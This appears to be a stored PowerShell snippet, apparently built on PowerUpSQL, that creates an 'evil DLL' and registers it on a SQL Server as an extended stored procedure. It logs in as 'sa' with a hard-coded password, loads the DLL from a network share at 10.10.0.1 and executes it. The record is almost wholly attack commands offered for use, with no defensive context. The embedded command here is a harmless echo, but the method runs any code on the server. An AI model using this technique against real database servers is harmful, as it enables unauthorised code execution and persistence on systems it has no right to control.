---
id: a086c786-792c-4537-a37d-75fe4f24e5e4
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:20.295292+00:00'
updated_at: '2023-04-10T20:36:30.723251+00:00'
---

# Code Snippet a086c786

**Language**: ps1

```ps1
# Create evil DLL
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test

# Load the DLL and call xp_test
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"

# Listing existing
Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```


